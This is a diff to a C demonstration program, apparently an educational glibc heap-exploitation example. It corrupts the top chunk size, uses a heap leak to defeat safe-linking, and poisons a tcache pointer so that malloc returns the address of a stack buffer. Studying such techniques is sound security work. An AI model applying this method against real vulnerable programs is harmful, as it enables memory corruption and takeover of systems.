@@ -9,7 +9,7 @@
 
 #define HEADER 0x10
 #define SIZE_1 (0x100-HEADER)
-#define SIZE_2 (0xee0-HEADER)
+#define SIZE_2 (0x1000-HEADER*3-(SIZE_1+HEADER))
 #define SIZE_3 (0x80-HEADER)
 
 /**
@@ -24,13 +24,15 @@
  */
 int main()
 {
+  assert(SIZE_1 != SIZE_3);
   // disable buffering
   setvbuf(stdout,NULL,_IONBF,0);
   setvbuf(stdin, NULL,_IONBF,0);
   setvbuf(stderr,NULL,_IONBF,0);
 
-  uint64_t top_size, new_top_size, *heap_ptr, target;
+  uint64_t top_size, new_top_size, vuln_tcache, *heap_ptr, *target;
   char win[0x10] = "WIN\0";
+  target = (uint64_t*) win;
   
   // first allocation 
   heap_ptr = malloc(SIZE_1); 
@@ -39,6 +41,8 @@ int main()
   top_size = heap_ptr[(SIZE_1/sizeof(uint64_t))+1];
   printf("first top size = 0x%llx\n", top_size);
   new_top_size = top_size&0xfff;
+
+  assert(new_top_size > (SIZE_3+HEADER)*2+HEADER*2);
 
   heap_ptr[(SIZE_1/sizeof(uint64_t))+1] = new_top_size;
   printf("new first top size = 0x%llx\n", new_top_size);
@@ -59,11 +63,11 @@ int main()
     printf("new top size = 0x%llx\n", new_top_size);
   }
 
-  // free the previous top chunk 
-  malloc(SIZE_2);
+  // this will be our vuln_tcache for tcache poisoning
+  vuln_tcache = (int64_t) &heap_ptr[(SIZE_2/sizeof(uint64_t))+2];
 
-  // this will be our target for tcache poisoning
-  target = (int64_t) &heap_ptr[(SIZE_2/sizeof(uint64_t))+2];
+  // free the previous top chunk 
+  heap_ptr = malloc(SIZE_2);
 
   // allocate less then the unsorted bin (created by the first top chunk),
   // but not SIZE_1 (circumvent prepared tcaches) in order to get leaks
@@ -76,18 +80,18 @@ int main()
 
   // allocate again into unsorted bin in order to start tcache poisoning
   heap_ptr = malloc(SIZE_3);
-  assert(heap_ptr < target);
+  assert((uint64_t)heap_ptr < (uint64_t)vuln_tcache);
   
-  // corrupt next ptr into pointo to win 
+  // corrupt next ptr into points to target
   // use a heap leak to bypass safe linking (GLIBC >= 2.32)
-  heap_ptr[(target-(uint64_t)heap_ptr)/8] = (uint64_t)&win ^ (target >> 12);
+  heap_ptr[(vuln_tcache-(uint64_t)heap_ptr)/8] = (uint64_t)target ^ (vuln_tcache >> 12);
 
   // allocate first tcache (corrupt next tcache bin)
   heap_ptr = malloc(SIZE_1);
   // get arbitary ptr for reads or writes 
   heap_ptr = malloc(SIZE_1);
 
-  // proof that heap_ptr now points to the same string as win
+  // proof that heap_ptr now points to the same string as target
   printf("%s\n", heap_ptr);
-  assert(heap_ptr == win);
+  assert(heap_ptr == target);
 }
